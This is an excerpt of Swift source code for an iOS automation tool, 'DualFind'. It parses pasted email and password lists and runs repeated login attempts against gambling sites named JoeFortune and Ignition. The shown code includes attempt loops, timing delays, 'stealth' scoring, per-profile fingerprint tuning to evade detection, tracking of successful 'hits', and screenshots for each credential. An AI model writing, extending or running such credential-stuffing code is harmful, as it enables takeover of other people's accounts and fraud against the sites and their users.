...
class DualFindViewModel {
    ...
    var pasteSpecialStatusMessage: String = ""
    var pasteSpecialStatusIsError: Bool = false
    ...
    var screenshotCount: DualFindScreenshotCount = .five
    ...
    var interventionNoAccountCount: Int = 0
    ...
    private static let pasteSpecialMarker: String = "PASSWORDS (case-sensitive)"
    private static let pasteSpecialEmailRegex: NSRegularExpression = {
    ...
    private let aiTelemetry = AITelemetryService.shared
    ...
    func importPasteSpecialFromClipboard() {
        guard let clipboardText = UIPasteboard.general.string?.trimmingCharacters(in: .whitespacesAndNewlines),
              !clipboardText.isEmpty else {
            pasteSpecialStatusMessage = "Clipboard is empty"
            pasteSpecialStatusIsError = true
            log("Paste Special failed: clipboard is empty", level: .warning)
            return
        }

        importPasteSpecial(from: clipboardText)
    }

    func importPasteSpecial(from text: String) {
        guard let markerRange = text.range(of: Self.pasteSpecialMarker) else {
            pasteSpecialStatusMessage = "Missing PASSWORDS section"
            pasteSpecialStatusIsError = true
            log("Paste Special failed: missing \(Self.pasteSpecialMarker)", level: .warning)
            return
        }

        let emailSection: String = String(text[..<markerRange.lowerBound])
        let emails: [String] = extractEmails(from: emailSection)
        let passwordSection: String = String(text[markerRange.upperBound...])
        let passwordResult: (passwords: [String], removedCount: Int) = sanitizePasswordLines(from: passwordSection)

        guard !passwordResult.passwords.isEmpty else {
            pasteSpecialStatusMessage = "No valid passwords found"
            pasteSpecialStatusIsError = true
            log("Paste Special failed: no valid passwords found below \(Self.pasteSpecialMarker)", level: .warning)
            return
        }

        emailInputText = emails.joined(separator: "\n")
        passwordInputText = passwordResult.passwords.joined(separator: "\n")
        pasteSpecialStatusIsError = false

        let emailLabel: String = "\(emails.count) email\(emails.count == 1 ? "" : "s")"
        let passwordLabel: String = "\(passwordResult.passwords.count) password\(passwordResult.passwords.count == 1 ? "" : "s")"
        if passwordResult.removedCount > 0 {
            pasteSpecialStatusMessage = "Imported \(emailLabel) · \(passwordLabel) · \(passwordResult.removedCount) filtered"
        } else {
            pasteSpecialStatusMessage = "Imported \(emailLabel) · \(passwordLabel)"
        }
        log("Paste Special imported \(emails.count) emails and \(passwordResult.passwords.count) passwords (\(passwordResult.removedCount) filtered)", level: .success)
    }

    func clearPasteSpecialStatus() {
        pasteSpecialStatusMessage = ""
        pasteSpecialStatusIsError = false
    }

    private func extractEmails(from text: String) -> [String] {
        let nsRange: NSRange = NSRange(text.startIndex..<text.endIndex, in: text)
        let matches: [NSTextCheckingResult] = Self.pasteSpecialEmailRegex.matches(in: text, options: [], range: nsRange)

        var emails: [String] = []
        var seen: Set<String> = []
        for match in matches {
            guard let range = Range(match.range, in: text) else { continue }
            let email: String = String(text[range]).trimmingCharacters(in: .whitespacesAndNewlines)
            let normalized: String = email.lowercased()
    ...
    private func sanitizePasswordLines(from text: String) -> (passwords: [String], removedCount: Int) {
        let candidates: [String] = text.components(separatedBy: .newlines)
            .map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
            .filter { !$0.isEmpty }
        ...
        for candidate in candidates {
            guard isAllowedPasswordLine(candidate) else {
                removedCount += 1
                continue
            }
            passwords.append(candidate)
        }
        return (passwords, removedCount)
    }

    private func isAllowedPasswordLine(_ line: String) -> Bool {
        guard line.count > 7 else { return false }

        let scalars: [UnicodeScalar] = Array(line.unicodeScalars)
        let isOnlyNumbers: Bool = scalars.allSatisfy { CharacterSet.decimalDigits.contains($0) }
        let isOnlyLetters: Bool = scalars.allSatisfy { CharacterSet.letters.contains($0) }

        return !isOnlyNumbers && !isOnlyLetters
    }
    ...
    private func sessionEmailLoop(sessionIndex: Int, site: LoginTargetSite, emails: [String], password: String, passwordIndex: Int) async {
        ...
        while true {
            ...
            if let fingerprint = preClickFingerprint {
                ...
                try? await Task.sleep(for: .milliseconds(automationSettings.betweenAttemptsDelayMs))
            }

            try? await Task.sleep(for: .milliseconds(automationSettings.postSubmitDelayMs))
            ...
            let host = session.targetURL.host ?? site.rawValue
            let sessionStealthId = "\(siteLabel)-\(sessionIndex)"
            let profileStats = AIFingerprintTuningService.shared.statsFor(profileIndex: sessionIndex)
            _ = aiTelemetry.computeStealthScore(
                sessionId: sessionStealthId,
                host: host,
                profileIndex: sessionIndex,
            ...
            case .noAccount:
                ...
                Task { [aiTelemetry] in
                    let snippet = (await session.getPageContent() ?? "").prefix(800)
                    await MainActor.run {
                        aiTelemetry.diagnoseFailure(
                            sessionId: sessionStealthId,
                            host: host,
                            email: email,
                            rawOutcome: "noAccount",
                            pageSnippet: String(snippet)
                        )
                    }
                }
    ...
    private func navigateAndSetupSession(session: LoginSiteWebSession, site: LoginTargetSite, label: String) async -> Bool {
        for attempt in 1...3 {
            ...
            if loaded {
                try? await Task.sleep(for: .milliseconds(automationSettings.postNavigationDelayMs))
                return true
            }
    ...
    private func finalizeRun() {
        ...
        aiTelemetry.finalizeRunSummary(total: totalPossible, successes: hits.count, extraContext: "DualFind · JoeFortune+Ignition · \(passwordSets.count) sets")
    }
    ...
    private func captureDualFindScreenshot(session: LoginSiteWebSession, email: String, password: String, site: LoginTargetSite, step: String, label: String) async {
        let limit = screenshotCount.perCredentialPerSiteLimit
        guard limit > 0 else { return }

        let currentCount = liveScreenshots.filter { $0.email == email && $0.platform == site.rawValue }.count
        guard currentCount < limit else {
            logger.log("[DualFind] Screenshot skipped: \(site.rawValue) limit \(limit)/site reached for \(email) (have \(currentCount))", category: .screenshot, level: .trace)
            return
        }
        ...
        logger.log("[DualFind] Screenshot captured: \(site.rawValue) step=\(step) for \(email) (\(currentCount + 1)/\(limit) per site)", category: .screenshot, level: .debug)
    }
